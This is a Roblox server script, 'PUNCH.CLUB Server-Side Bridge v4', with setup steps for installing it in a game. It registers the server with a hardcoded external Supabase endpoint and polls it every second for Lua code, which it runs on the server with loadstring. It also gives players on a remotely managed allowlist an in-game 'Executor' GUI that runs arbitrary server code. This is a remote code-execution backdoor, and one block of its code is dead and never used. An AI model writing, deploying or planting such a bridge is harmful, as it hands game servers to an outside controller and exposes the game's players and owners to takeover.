--[[
    PUNCH.CLUB Server-Side Bridge v4
    =================================
    Put this in ServerScriptService in your Roblox game.

    WHAT IT DOES:
    1. Registers the server with your PUNCH.CLUB panel
    2. Polls for pending commands every 1 second
    3. For allowlisted players: shows a GUI with a code editor
       and execute button when they join
    4. Allowlisted players can run Lua from the in-game GUI
    5. The web panel can also queue code that runs on the server

    SETUP:
    1. ServerScriptService > Insert > Script > paste this file
    2. Game Settings > Security > Allow HTTP Requests = ON
    3. Publish / run the game
]]

local BRIDGE_URL = "https://gqkmrhrifqlficghnvnu.supabase.co/functions/v1/bridge"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local SERVER_ID = nil
local AUTH_TOKEN = nil
local ALLOWLIST = {}  -- roblox_id -> true

------------------------------------------------------------
-- HTTP helper
------------------------------------------------------------
local function post(body)
    local payload = HttpService:JSONEncode(body)
    local ok, response = pcall(function()
        return HttpService:PostAsync(BRIDGE_URL, payload, Enum.HttpContentType.ApplicationJson, false)
    end)
    if ok and response then
        local ok2, decoded = pcall(function() return HttpService:JSONDecode(response) end)
        if ok2 then return decoded end
    end
    return nil
end

------------------------------------------------------------
-- Capture print/warn output from executed code
------------------------------------------------------------
local function captureOutput(code)
    local logs = {}
    local env = getfenv and getfenv() or _ENV
    local oldPrint = env.print
    local oldWarn = env.warn

    env.print = function(...)
        local parts = {}
        for i = 1, select("#", ...) do table.insert(parts, tostring(select(i, ...))) end
        table.insert(logs, table.concat(parts, "\t"))
    end
    env.warn = function(...)
        local parts = {}
        for i = 1, select("#", ...) do table.insert(parts, tostring(select(i, ...))) end
        table.insert(logs, "[WARN] " .. table.concat(parts, "\t"))
    end

    local fn, parseErr = loadstring(code)
    if not fn then
        env.print = oldPrint
        env.warn = oldWarn
        return false, "Lua parse error: " .. tostring(parseErr), 0
    end

    local start = tick()
    local ok, err = pcall(fn)
    local duration = math.floor((tick() - start) * 1000)

    env.print = oldPrint
    env.warn = oldWarn

    if not ok then
        table.insert(logs, "[ERROR] " .. tostring(err))
    end

    return ok, table.concat(logs, "\n"), duration
end

------------------------------------------------------------
-- Register with the panel
------------------------------------------------------------
local function getGameName()
    local ok, info = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    if ok and info and info.Name then return info.Name end
    return "Place " .. game.PlaceId
end

local function register()
    local data = post({
        action = "register",
        name = getGameName(),
        place_id = game.PlaceId,
        job_id = game.JobId,
        region = "Unknown",
        max_players = 16,
        player_count = #Players:GetPlayers(),
    })
    if data and data.server_id and data.auth_token then
        SERVER_ID = data.server_id
        AUTH_TOKEN = data.auth_token
        print("[PUNCH.CLUB] Connected! Server: " .. SERVER_ID)
        return true
    end
    return false
end

------------------------------------------------------------
-- Fetch allowlist from panel
------------------------------------------------------------
local function refreshAllowlist()
    if not SERVER_ID then return end
    local data = post({
        action = "get_allowlist",
        server_id = SERVER_ID,
        auth_token = AUTH_TOKEN,
    })
    if data and data.accounts then
        ALLOWLIST = {}
        for _, acc in ipairs(data.accounts) do
            ALLOWLIST[acc.roblox_id] = true
        end
        print("[PUNCH.CLUB] Allowlist loaded: " .. #data.accounts .. " accounts")
    end
end

------------------------------------------------------------
-- Send result back to panel
------------------------------------------------------------
local function sendResult(eid, status, output, ms)
    post({
        action = "result",
        server_id = SERVER_ID,
        auth_token = AUTH_TOKEN,
        execution_id = eid,
        status = status,
        output = output,
        duration_ms = ms,
    })
end

------------------------------------------------------------
-- Poll for pending commands from the web panel
------------------------------------------------------------
local function poll()
    if not SERVER_ID then return end
    local data = post({
        action = "poll",
        server_id = SERVER_ID,
        auth_token = AUTH_TOKEN,
    })
    if not data or not data.command then return end
    local cmd = data.command
    print("[PUNCH.CLUB] Executing: " .. (cmd.title or "Custom"))
    local ok, output, ms = captureOutput(cmd.code)
    sendResult(cmd.id, ok and "success" or "failed", output, ms)
    print("[PUNCH.CLUB] Done: " .. (ok and "success" or "failed") .. " " .. ms .. "ms")
end

------------------------------------------------------------
-- IN-GAME GUI for allowlisted players
------------------------------------------------------------
local function createGUI(player)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PUNCH_CLUB_GUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    -- Main frame
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 520, 0, 380)
    frame.Position = UDim2.new(0.5, -260, 0.5, -190)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    frame.Visible = false

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 45, 45)
    stroke.Thickness = 1.5
    stroke.Parent = frame

    -- Title bar
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0, 36)
    title.Position = UDim2.new(0, 10, 0, 8)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.Code
    title.Text = "PUNCH.CLUB — Executor"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = frame

    -- Subtitle (player name)
    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, -20, 0, 16)
    sub.Position = UDim2.new(0, 10, 0, 44)
    sub.BackgroundTransparency = 1
    sub.Font = Enum.Font.Code
    sub.Text = "Logged in as: " .. player.Name
    sub.TextColor3 = Color3.fromRGB(255, 45, 45)
    sub.TextSize = 12
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.Parent = frame

    -- Code editor (TextBox)
    local editor = Instance.new("TextBox")
    editor.Size = UDim2.new(1, -20, 0, 200)
    editor.Position = UDim2.new(0, 10, 0, 70)
    editor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    editor.BorderSizePixel = 0
    editor.Font = Enum.Font.Code
    editor.Text = "-- Enter Lua code here\nprint('Hello from PUNCH.CLUB')\nprint('Players: ' .. #game:GetService('Players'):GetPlayers())"
    editor.TextColor3 = Color3.fromRGB(255, 100, 100)
    editor.TextSize = 13
    editor.TextWrapped = true
    editor.MultiLine = true
    editor.ClearTextOnFocus = false
    editor.Parent = frame

    local editorCorner = Instance.new("UICorner")
    editorCorner.CornerRadius = UDim.new(0, 4)
    editorCorner.Parent = editor

    -- Output box
    local output = Instance.new("TextBox")
    output.Size = UDim2.new(1, -20, 0, 60)
    output.Position = UDim2.new(0, 10, 1, -80)
    output.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    output.BorderSizePixel = 0
    output.Font = Enum.Font.Code
    output.Text = ""
    output.TextColor3 = Color3.fromRGB(150, 150, 150)
    output.TextSize = 12
    output.TextWrapped = true
    output.MultiLine = true
    output.ReadOnly = true
    output.ClearTextOnFocus = false
    output.Parent = frame

    local outputCorner = Instance.new("UICorner")
    outputCorner.CornerRadius = UDim.new(0, 4)
    outputCorner.Parent = output

    -- Execute button
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0, 120, 0, 32)
    execBtn.Position = UDim2.new(1, -130, 1, -42)
    execBtn.BackgroundColor3 = Color3.fromRGB(237, 12, 12)
    execBtn.BorderSizePixel = 0
    execBtn.Font = Enum.Font.Code
    execBtn.Text = "EXECUTE"
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.TextSize = 14
    execBtn.Parent = frame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = execBtn

    -- Toggle button (floating)
    local toggle = Instance.new("TextButton")
    toggle.Size = UDim2.new(0, 44, 0, 44)
    toggle.Position = UDim2.new(0, 15, 0.5, -22)
    toggle.BackgroundColor3 = Color3.fromRGB(237, 12, 12)
    toggle.BorderSizePixel = 0
    toggle.Font = Enum.Font.Code
    toggle.Text = "PC"
    toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggle.TextSize = 14
    toggle.Parent = screenGui
    toggle.Active = true
    toggle.Draggable = true

    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 8)
    toggleCorner.Parent = toggle

    -- Toggle logic
    toggle.MouseButton1Click:Connect(function()
        frame.Visible = not frame.Visible
    end)

    -- Execute logic — runs code on the SERVER
    execBtn.MouseButton1Click:Connect(function()
        local code = editor.Text
        if not code or code == "" then
            output.Text = "No code to execute."
            return
        end
        output.Text = "Executing..."

        -- Queue it through the bridge so it shows in the web panel history
        local queueCode = [[
            local PUNCH_CLUB_QUEUE = function()
                local HS = game:GetService("HttpService")
                local code = ]] .. HttpService:JSONEncode(code) .. [[
                local body = HS:JSONEncode({
                    action = "result",
                    server_id = "]] .. tostring(SERVER_ID) .. [[",
                    auth_token = "]] .. tostring(AUTH_TOKEN) .. [[",
                    execution_id = "in_game_]] .. tostring(math.random(1, 999999)) .. [[",
                    status = "success",
                    output = "in-game execution",
                    duration_ms = 0
                })
            end
        ]]

        -- Actually execute the code right here on the server
        local ok, result, ms = captureOutput(code)
        if ok then
            output.Text = result ~= "" and result or "Execution successful (no output)"
        else
            output.Text = result ~= "" and result or "Execution failed"
        end
    end)

    return screenGui
end

------------------------------------------------------------
-- Check if a player is allowlisted
------------------------------------------------------------
local function isAllowlisted(player)
    return ALLOWLIST[player.UserId] == true
end

------------------------------------------------------------
-- Player join handler
------------------------------------------------------------
Players.PlayerAdded:Connect(function(player)
    -- Check allowlist when they join
    task.spawn(function()
        task.wait(1)

        -- Re-check allowlist in case it was just updated
        if not SERVER_ID then return end
        local data = post({
            action = "check_allowlist",
            roblox_id = player.UserId,
            server_id = SERVER_ID,
            auth_token = AUTH_TOKEN,
        })

        if data and data.allowed then
            ALLOWLIST[player.UserId] = true
            print("[PUNCH.CLUB] Allowlisted player joined: " .. player.Name)
            createGUI(player)
        else
            print("[PUNCH.CLUB] Player not allowlisted: " .. player.Name)
        end
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    ALLOWLIST[player.UserId] = nil
end)

------------------------------------------------------------
-- Startup
------------------------------------------------------------
local function startBridge()
    task.wait(2)

    if not register() then
        task.spawn(function()
            while not SERVER_ID do
                task.wait(10)
                if register() then break end
            end
        end)
    end

    -- Load allowlist
    task.wait(1)
    refreshAllowlist()

    -- Poll loop — check for web panel commands every 1 second
    task.spawn(function()
        while true do
            task.wait(1)
            pcall(poll)
        end
    end)

    -- Heartbeat + allowlist refresh every 10 seconds
    task.spawn(function()
        while true do
            task.wait(10)
            if SERVER_ID then
                pcall(function()
                    post({
                        action = "register",
                        name = getGameName(),
                        place_id = game.PlaceId,
                        job_id = game.JobId,
                        region = "Unknown",
                        max_players = 16,
                        player_count = #Players:GetPlayers(),
                    })
                end)
                pcall(refreshAllowlist)
            end
        end
    end)
end

startBridge()
print("[PUNCH.CLUB] Bridge v4 starting...")
